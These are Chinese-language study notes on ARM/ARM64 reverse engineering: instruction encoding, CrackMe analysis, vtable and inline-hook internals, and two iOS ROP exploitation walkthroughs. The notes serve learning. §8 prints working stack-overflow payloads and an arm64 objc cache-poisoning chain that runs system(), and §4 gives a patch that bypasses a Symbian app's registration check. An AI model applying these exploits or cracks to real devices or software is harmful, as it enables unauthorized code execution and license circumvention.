# ARM/ARM64 汇编逆向与 ROP 实战

> 定位:从看雪 16 篇 ARM 帖提炼的实战知识——ARM/Thumb 指令要点、机器码手工编码、CrackMe 汇编分析套路、C++ 虚函数与 inlinehook 的汇编层、iOS armv7/arm64 ROP 两案全流程。NOP 字节表与 arm64 分支编码见 `手法/16-常用速查/常用手法速查.md`,此处不重复。

---

## §1 ARM/Thumb 指令要点速查(基础四篇合并)

> 来源合并:ARM汇编简介(ljcnaix)、ARM指令集(ljcnaix)、ARM汇编简介(二)ARM指令集(amzilun)、Arm指令介绍(dig_grave)

### 1.1 状态与切换

- ARM 态指令定长 32 位;Thumb 16 位,Thumb-2 可 32 位(`.w` 后缀);状态与特权级无关。
- 切换:① `BX/BLX reg` 且目标 bit0=1(如 0x5530+1);② CPSR T 位=1。ARM 态全指令条件执行,Thumb-2 用 IT;写 shellcode 用 16 位 Thumb 代替 32 位 ARM,减少 `\0` 截断。

### 1.2 寄存器与 PC 的流水线偏移(逆向高频坑)

| 寄存器 | 别名 | 用途 | x86 对照 |
|---|---|---|---|
| R0-R3 | - | 通用;**函数前 4 参数** | EAX/EBX/ECX/EDX |
| R4-R10 | - | 通用(被调用方保存) | ESI/EDI 等 |
| R7 | - | **系统调用号**(Linux);Thumb 下常作 FP | - |
| R11 | FP | 帧指针 | EBP |
| R12 | IP | intra-procedure scratch | - |
| R13 | SP | 栈指针 | ESP |
| R14 | LR | 返回地址 | - |
| R15 | PC | 程序计数器 | EIP |
| CPSR | - | 状态标志 N/Z/C/V/E/T/M | EFLAGS |

**PC 坑**:直接读 PC:ARM 态=当前指令+8,Thumb 态=+4(流水线超前取指;实测 `mov r0,pc` 于 0x10054 → R0=0x1005C)。`ADD Rx,PC,Ry` 相对寻址、算 literal pool 位置必须按 +8/+4 算,否则差 2 条指令。

### 1.3 指令模板与第二操作数

- 模板 `MNEMONIC{S}{condition} {Rd}, Operand1, Operand2`;`{S}` 依据结果更新 CPSR(比较/条件执行前提),`{condition}` 默认 AL,执行前查标志组合。
- Operand2 灵活操作数:`#123`(取值受限,见 1.6)/`Rx`/`Rx, LSL|LSR|ASR|ROR n 或 RRX`。桶形移位可两指令合一条:`MOV R1,R0,LSL#1`=R1=R0*2,省一条乘法。

### 1.4 常用指令表(逆向向)

| 指令 | 描述 | 指令 | 描述 |
|---|---|---|---|
| MOV/MVN | 传送/取反传送 | LDR/STR | 加载/存储 |
| ADD/SUB/RSB | 加/减/逆减(RSB Rd,Rn,Rm 即 Rd=Rm-Rn) | LDM/STM | 多寄存器加载/存储 |
| MUL | 乘法 | PUSH/POP | 压栈/出栈 |
| EOR/AND/ORR | 位运算 | B/BL | 跳转/带返回跳转(LR=PC+4) |
| CMP/TST | 比较(减/与 只置标志) | BX/BLX | 带状态切换跳转 |
| LSL/LSR/ASR/ROR | 移位 | SWI/SVC | 系统调用 |
| SMULL/UMULL | 64 位有/无符号乘(除法优化关键) | - | - |

### 1.5 load/store 寻址(3 种偏移形式 × 3 种地址模式)

- 偏移形式:立即数 `[Rb,#imm]`、寄存器 `[Rb,Rc]`、缩放寄存器 `[Rb,Rc,LSL#2]`(数组遍历常用);`[Rx]` 方括号内寄存器值=要访问的内存地址。

| 地址模式 | 语法 | 行为 |
|---|---|---|
| 偏移 | `STR R2, [R1, #2]` | 访问 R1+2,基址不变 |
| 预索引 | `STR R2, [R1, #4]!` | 访问 R1+4,**基址改为 R1+4** |
| 后索引 | `LDR R3, [R1], #4` | 先访问 R1,**然后 R1=R1+4** |

- 字符串/常量寻址:`LDR R0,=(label-本指令地址)` 再 `ADD R0,PC,R0` 得绝对地址(位置无关);编译后常变型 `LDR R4,[PC,R4]`(literal pool,池地址按 PC+8 算)。批量搬运靠 `!` 写回省 ADD:`LDMIA R3!,{R0-R2}` 取后 R3+0xC、`STMIA R12!,{R0-R3}` 存后 R12+0x10;后缀 IA/IB/DA/DB,递减时**寄存器列表反向对应**(低地址=编号最小)。
- 字长后缀:`STRH/STRB` 存半字/字节,`LDRB/LDRH/LDRSH/LDRSB` 按符号加载。

### 1.6 立即数编码限制(补丁/手写 shellcode 必看)

12 位立即数 = 8 位 n(0-255)+4 位旋转 r:`v = n ROR 2r`。**只有能由一个字节循环右移偶数位得到的数才合法**。

- 合法:`#256`(1 ror 24)、`#0x06000000`(6 ror 8)。非法:`#370`(185 ror 31 超界)、`#511`(位型超一字节)、`#0x06010000`。
- 绕过:① 拆分 `MOV R0,#256; ADD R0,#255`;② 伪指令 `LDR R1,=511`(汇编器转 MOV 或落 literal pool)。判断脚本 rotator.py(照抄可用):
```python
ror = lambda val, r, m=32: ((val & (2**m-1)) >> r % m) | (val << (m-(r % m)) & (2**m-1))
def check_immediate(x):
    for n in range(1, 256):
        for i in range(0, 31, 2):
            if ror(n, i) == x: return True, n, i
    return False, None, None
```

### 1.7 条件码 + IT 指令

- 常用条件码:EQ(Z=1)/NE(Z=0)、GT(Z=0&&N=V)/LT(N!=V)/GE(N=V)/LE(Z=1||N!=V)、HS(C=1)/LO(C=0)、HI(C=1&&Z=0)、MI(N=1)/PL(N=0)、VS/VC(溢出)、AL。Thumb-2 用 IT 块:`IT{x{y{z}}} cond` 最多管 4 条,块内条件后缀须同条件或其逻辑反,分支只能放最后一条。例:`ITTE NE` + `ANDNE R0,R0,R1`(Then)+ `ADDSNE R2,R2,#1`(Then)+ `MOVEQ R2,R3`(Else)。
- ARM→Thumb 切换样板:`.code 32` 下 `ADD R3,PC,#1`(bit0 置 1)+ `BX R3`,再 `.code 16` 写 Thumb。

### 1.8 栈类型与 PUSH/POP

逆向只见 FD(满递减,ARM/AAPCS 标配):`STMFD`=PUSH、`LDMFD`=POP(FA/ED/EA 见指令手册)。PUSH:SP-=4 后写入;POP:读出后 SP+=4。

---

## §2 Thumb 地址对齐与调试器坑

### 关于thumb2指令下函数运行地址对齐问题及验证固件分析
作者:不爱榴莲吖

- 现象:STM32(Cortex-M3)固件函数地址奇数(`08000BB1`、`080002D9`)。ARM 4 字节/Thumb 2 字节对齐最低位必 0,**最低位被征用表示状态**:函数指针 bit0=1 → Thumb 态;编译器把「真实地址+1」存进 ROM(0x08000BC4 处读到 0x080002D9 = 0x080002D8+1)。Cortex-M 复位:0x0 内容→SP,0x4→PC(Reset_Handler)。
- IDA 加载此类 bin 手工配 ROM/RAM 基址;分析跳转表/函数表先剥 bit0 再算真实地址。

### 修正lldb-310及以后版本的Thumb反汇编问题
作者:Isaiah

- 现象:ARMv7s+Thumb2+无符号,lldb-310+ 无法正确反汇编 Thumb(300 可以)。根因:lldb 用 MachO FunctionStarts 判各地址指令集,查不到符号默认按 ARM 态;310 的 `ClearModules` 意外清空节表(`m_section_load_history.Clear()`),查询返回 -1 未判有效,符号信息丢失。
- 修复:改 `Target::SetExecutableModule`,注释掉 `ClearModules(false)` 与 `m_section_load_history.Clear()`。经验:无符号 Thumb 反汇编错乱,先怀疑符号/节表路径,不一定是代码本身。

---

## §3 机器码编码与手工计算

### thumb2 BL / BLX指令机器码计算
作者:cacorothuo

- BL/BLX 为 32 位 Thumb 指令(两个半字),**高半字在后**(小端文件里先低后高)。解码(求目标地址):高半字 H 后 11 位=offset_high,低半字 L 后 11 位=offset_low;`offset=(offset_high<<12)|(offset_low<<1)`;符号位(第 25 位)0→向后 `dst=srcPC+4+offset`,1→向前(取反加一为负)`dst=srcPC+4-|offset|`。用途:patch 跳转/内联 call 不查手册直接套公式;手算验证反汇编器输出。
```
0012  00F0 01F8  bl .Lhelo       ; H=f000→000,L=f801→001;(000<<12)|(001<<1)=2 → 0x12+4+2=0x18 ✓
00001164  F7FF FFBE  bl _Z4testv ; H=f7ff→7ff,L=ffbe→7be;(7ff<<12)|(7be<<1)=7fff7c 符号位1 → 取 0x84;0x1164+4-0x84=0x10e4 ✓
```
- 编码(汇编→机器码,照抄):
```c
// BL <label>
offset = dstAddr - srcAddr;
offset = (offset - 4) & 0x007fffff;
high = offset >> 12;  low = (offset & 0x00000fff) >> 1;
machineCode = ((0xFF00 | low) << 16) | (0xF000 | high);
// BLX <label>:low 奇数先 +1(目标 4 字节对齐),魔数 0xFF00 改 0xEF00,其余同上
```

### arm指令转换机器码工具
作者:kuty

不查编码表,借 GCC 交叉汇编器转:写一行 `.s` 汇编出 `.o` 读机器码(原工具支持 thumb/arm/aarch64 助记符→机器码查询)。自建流水线:
```bash
echo 'ldr.w pc,[pc,#0]' > t.s
arm-linux-gnueabi-as -mthumb t.s -o t.o && arm-linux-gnueabi-objdump -d t.o   # 或 objcopy -O binary + xxd
```

写 exploit 填充字节、造花指令、验证手算编码最快。

---

## §4 CrackMe 汇编分析实战

### 第一枚ARM汇编版CrackMe分析
作者:Speeday

32 位 ARM ELF CrackMe,`main(argc,argv)` 用 argv[1] 与运算结果 strcmp。识别套路:

- 入口:`STMFD SP!,{R4-R8,LR}` 保存现场;`SUB SP,SP,#0x48` 开局部空间;字符串取址 `LDR R3,=(str-off); ADD R3,PC,R3`(PC 相对)。数据批量搬运 `LDMIA!/STMIA!` 倒手+`STR/STRH/STRB` word/半字/字节拆装(套路见 1.5)。
- 栈 canary:`LDR R4,[PC,R4]`(off_AFAC 函数指针)→ `LDR LR,[R4]` → `STR LR,[SP,#0x44]`,退出前 `CMP` 校验。核心算法(编译器优化点):
```asm
loc_8588:
LDR     R1, [R3]          ; 取 keys[i]
LDRB    R12, [R0,#1]!     ; 取 name[i](前索引写回)
EOR     R1, R1, #7        ; keys[i]^=7
SMULL   R8, R7, R2, R1    ; 除法变乘法:R2=0x2AAAAAAB
SUB     R1, R7, R1,ASR#31 ; 符号修正:(R1*魔数>>32)-(R1>>31)
SUB     R1, R1, #2        ; 源码 +22-24 合并为 -2
EOR     R1, R1, R12       ; ^name[i]
STR     R1, [R3],#4       ; 存回,后索引
CMP     R3, R5
BNE     loc_8588
```

- **除 6 无除法实现**:乘魔数 0x2AAAAAAB 取高 32 位,再减 `ASR#31` 修正;识别特征=SMULL/UMULL+0x2AAAAAAB(÷6)、0xCCCCCCCD(÷10),见魔数即还原除法。
- 源码 `+=22;-=24` 被合并成 `SUB #2`——按等价式还原,别逐句对。第二轮 byte 拆装:`LDR R1,[R3,#4]!` 前索引取、`STRB R1,[R2,#1]!` 存,末尾补 `\0`;比对 `BL _strcmp; CMP R0,#0; BEQ 成功`。
- 对应源码:`keys[]={0xb,0x1f,0x19,0x19,0x49,0xb,0xb,0xb,0x31,0x53}` 循环 `keys[i]^=7; /=6; -=2; ^=name[i]`(name="helloworld")。

### 第二枚ARM汇编程序分析
作者:Speeday

Android so(HelloJNI 改),覆盖 for/while/switch/子程序调用全结构。

- **除 10 求模套路**(UMULL 版):`LDR R4,=0xCCCCCCCD`(÷10 魔数)→ `MOV R3,R3,LSR#2` → `UMULL R5,R1,R4,R3`(高 32 位进 R1)→ `MOV R1,R1,LSR#3` 得商 → `MUL R1,R12,R1`(商*10)→ `RSB R1,R1,R3` 得余数(name[i]%10)→ `AND R1,R1,#0xFF`。验算 a=16:高位 C>>3=1,1*10=10,16-10=6=16%10 ✓。
- **条件指令合并 if/else**:源码 `%2==0 ? +10 : +5` 编译成先统一 `SUB R1,R2,#0x14`(-20)、`TST R1,#1` 测最低位,再 `SUBEQ R2,R2,#0xA`(偶)/`SUBNE R2,R2,#0xF`(奇)——把「提前减的公共量」与「条件增量」合起来还原(±10/±5 对应 -0xA/-0xF)。
- **switch 跳转表(ARM 版)**:`CMP R1,#8` 后 `ADDLS PC,PC,R1,LSL#2`——紧跟的 B 指令表(4 字节一项,如 `loc_CBC: B loc_D30`=case 0)按 case 索引分发,`LS` 兼做边界检查(越界走 default `B loc_D38`);case 体一条 `MOV R3,#imm; B 公共出口`。
- **JNI 出口**:`LDR R3,[R5]; LDR R3,[R3,#JNINativeInterface.NewStringUTF]; BLX R3`(JNIEnv 函数表间接调用并切态)。
- **远程调试 so**:`adb shell /data/local/tmp/android_server` → `adb forward tcp:23946 tcp:23946` → IDA 附加 Ctrl+S 找 so 基址;断点=基址+静态偏移(0x491dc000+0xbc4=0x491dcbc4)。

### ARM指令集的Crack过程(Symbian)
作者:黑手K9998

Symbian S60(IDA 选 PDAs/Handhelds/Phones → Symbian EPOC SIS 载入)注册分析:

- 注册码绑定 IMEI:定位 `BL PlpVariant::GetMachineIdL(TBuf<128>&)`,后续 `TDesC16::AtC`/`LDRH R0,[R0]` 逐字符取 ASCII。循环体要点:`SUB R0,R7,#5; CMP R0,#4; BLS loc_DE6`(i<5 或 >9 跳过加权,只处理部分位);`LDR R4,=0x30B`(权重 779)累加;`LSL R0,R0,#1`(ASCII*2)相加;`CMP R7,#0xE; BLE` 循环 14 次(IMEI 位数)。HEX 计算器逐轮模拟 R5 累加即得注册码。
- **爆破点**:`.text:10000DEC ADD R0,R5,#0` 改 `MOV R0,#0` 则 "0" 永远正确——算法定型后 patch 一条指令定生死。

---

## §5 GNU ARM 汇编堆栈实验

### GNU ARM汇编堆栈操作演示
作者:yjmwxwx

`.thumb + .syntax unified` 裸机 Cortex-M 完整堆栈全流程(照抄可用;向量表:`.word 栈顶+1`、`.word start+1`——SP 位域强制对齐 bit0 无所谓,入口 +1 = Thumb 态):
```asm
duizhanshiyan:
    push {r0-r12,lr}           @ 13 字压栈
    mov  r7, sp                @ 备份栈帧基址(Thumb 无 FP 惯例时手动)
    sub  sp, #0x30             @ 开 0x30 局部变量区
    # (省略:r0-r12 置新值后 str rN,[sp,#0x04*i] 逐槽放变量)
    add  sp, #0x30             @ 丢弃变量区,回到压栈后顶
    # (省略:倒序覆写原 R0-R12 槽)
    mov  sp, r7                @ 恢复栈帧
    pop  {r0-r12,pc}           @ 弹回并返回(pop pc = 返回)
```
- 手动帧:`mov r7,sp` 存基址、返回前 `mov sp,r7` 恢复——逆向见「sp 存进某寄存器再还回来」即手动开/关栈帧。`pop {…,pc}` 是 Thumb 无 `pop lr` 语义时的标准返回;大现场用 `push {r0-r12,lr}`/`pop {r0-r12,pc}` 对称恢复。

---

## §6 C++ 虚函数的汇编层实现

### 从 Arm 汇编看 Android C++虚函数实现原理
作者:ManyFace(帖:MindStorm)

- **单类**:对象 = vtable 指针(4B)+字段;构造函数先写 vtable 再跑构造体。调用 `baseA->baseA_virtual_2()` → `(*(*v0+4))(v0)`:取对象头→vtable[1]→以对象指针为第 0 参调用。**实例方法第 0 参数永远是 this**。
- **单继承**:无重写时子对象=父类部分(父 vptr+父字段)+子字段,子构造先跑父构造(写父 vtable)**再覆盖为子 vtable**,子 vtable=前段父虚函数地址+后段子类新增;有重写时被重写槽位直接换成子函数、其余不动——多态=换槽。
- **多继承**:对象 = n*(vptr+父字段)+子字段,按声明序排,每父一份 vptr。调第二父类虚函数 `(*(v0[2]+8))(v0+2)`——**this 要加偏移**,传父类子对象基址而非对象头;子类虚函数挂第一个父类 vtable 后;作用域写死调用(`subClass->BaseA::virtual_1()`)编译期定址不走 vtable。多继承+重写:各父类 vtable 被重写槽**都要**换,非首父的重写函数按声明序在子虚函数区补一份(保证子指针直接可调);非首父 vtable 前有 `0xFFFFFFF8/0xFFFFFFF0`(负偏移 -8/-16)thunk 调整 this。
- 逆向识别:对象 malloc 大小=4×父类数+字段和;构造函数「先父构造后写 vptr」双重写;调用点 `[obj+k*4]` 取 vtable、`+偏移` 取槽、`(obj+k*4)` 做 this——三步还原类层级。

---

## §7 inlinehook 的汇编层

### Arm汇编层面理解inlinehook
作者:唱过阡陌

Android thumb so inlinehook 前后对比(实测):

- hook = **替换目标函数前 4 条 thumb 指令(8 字节)**为一条 32 位 Thumb 跳转 `DF F8 00 F0` = `ldr.w pc,[pc,#0]`:从紧随其后的 4 字节地址槽取目标装进 PC(三级流水线下译码时 PC=跳转指令地址)。被替换的 4 条原指令**搬到新函数开头**先执行(保现场/对齐寄存器状态),再走新逻辑。
- 回调原函数:框架动态生成 trampoline,核心是**修改已压栈的 LR**——老函数 `pop {pc}` 时返回「新函数调用老函数的下一条」而非原调用者;新函数返回走标准 epilogue(`pop {r4-r7,pc}`)回原调用者。
- 逆向识别:函数头出现 `DF F8 xx F0`(ldr.w pc,[pc,#imm])或 `mov pc` 类异常跳转+紧跟数据槽即被 inline;还原原逻辑要找回搬迁的头部指令(注册回调时框架 dump,内存搜原机器码)。

---

## §8 ROP 原理与 iOS 实战两案

### iOS系统下的ROP利用实践(armv7 栈溢出)
作者:luoyanbei

越狱 iPhone4s iOS7.1(32 位 ARM);漏洞=main 里 `char buff[12]` + `scanf("%s",buff)` 无长度限制;secret() 内 `system(command)`。编译关保护:`-fno-pie -fno-stack-protector -mno-thumb`(需旧 7.1 SDK,新 SDK 禁 system())。

- **偏移定位**:输入 `AAAABBBB…EEEEFFFF` 崩溃,看 `/var/Logs/CrashReporter` 寄存器现场:r7=0x45454545、pc=0x46464644 → buff→r7 20 字节→再 4 字节是 LR 槽。**ARM 栈溢出劫持 LR:main 返回 `pop {r7,pc}` 送 PC**;崩溃日志=免费 offset 探测器(无需 cyclic)。
- **第一级(单函数)**:`printf "AAAABBBBCCCCDDDDEEEE\x64\xbe\x00\x00" | ./roplevel`——change() 地址 0xbe64(gdb `disas change` 得)小端填进 LR 槽;输出后 Bus error(链没闭合)。
- **第二级(链式,核心技巧)**:change() 入口 `push {r7,lr}`、结尾 `pop {r7,pc}`——**让 LR 指向 change+4 跳过 push**(不破坏语义,`mov r7,sp` 照常),结尾 pop 消费 main 栈里的下两个 4 字节:第一个进 r7(垃圾),第二个进 pc → secret():
```
AAAABBBBCCCCDDDDEEEE\x68\xbe\x00\x00FFFF\xa8\xbe\x00\x00
                      └ change+4 ┘    └r7┘ └ secret=0xbea8 ┘
```

干货:armv7 无 gadget 库最简链 = 覆 LR → 目标函数+4(跳 push)→ 栈上排 [垃圾r7][下一目标];每级函数再吃栈延伸,对齐按 4 字节。

### iOS_arm64下的ROP实践:利用gadget执行system命令
作者:luoyanbei

越狱 iPhone5s iOS8.4(arm64),ASLR+DEP+PIE 全开,但 **dyld_shared_cache(/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64)开机后地址固定且全进程一致**——gadget 库从这取。流程:

1. 导出 dyld_shared_cache_arm64 → 抽 CoreFoundation,ROPgadget 选中 `0x181ccef6c : ldr x1, [x0, #0x98] ; ldr x0, [x0, #0x70] ; cbz x1, #0x181ccef88 ; br x1`;IDA 算偏移 `0x181ccef6c - CoreFoundation基址(0x181BF0000) = 0xDEF6C`,运行时真地址=`find_library_load_address("CoreFoundation")+0xDEF6C`。
2. **按 gadget 汇编伪造 objc 对象**(每个 `ldr xN,[x0,#imm]` 对应结构体一个 `+imm` 字段,pad 补齐):
```objc
struct fake_receiver_t {
    uint64_t fake_objc_class_ptr;   // +0x00 类指针
    uint8_t  pad1[0x70-0x8];
    uint64_t x0;                    // +0x70 ← ldr x0,[x0,#0x70] 取到,做 system 参数
    uint8_t  pad2[0x98-0x70-0x8];
    uint64_t x1;                    // +0x98 ← ldr x1,[x0,#0x98] 取到,br x1 跳这
    char     cmd[1024];
} fake_receiver;  // 另配 fake_objc_class_t{pad[0x10];cache_buckets_ptr→bucket;mask} + fake_cache_bucket_t{cached_sel; cached_function→gadget}
```
3. 触发(objc_msgSend 走缓存命中即入 gadget):
```objc
fake_cache_bucket.cached_sel      = (void*)NSSelectorFromString(@"release");
fake_cache_bucket.cached_function = (void*)(base + 0xDEF6C);   // gadget
fake_receiver.x0 = (uint64_t)&fake_receiver.cmd;               // system 参数
fake_receiver.x1 = (void*)dlsym(RTLD_DEFAULT, "system");       // br x1 目标
strcpy(fake_receiver.cmd, "touch /tmp/IceAndFire");
# (省略:fake_objc_class/fake_receiver 各指针接线)
[talker release];
```

干货:arm64 无 push-lr 型简单链,改走 **objc 缓存投毒+单 gadget 中转**——`ldr x1,[x0,#imm]; ldr x0,[x0,#imm2]; br x1` 类 gadget 天然是「参数装载器+跳转器」,x0(参数)/x1(目标函数)都做成伪造对象字段,一次 `br` 完成 system 调用;偏移必须用**目标设备上抽取**的同版本库算(shared_cache 随系统版本变);突破 PIE = shared_cache 固定地址 + 运行时 `find_library_load_address`/`dlsym` 取真基址。
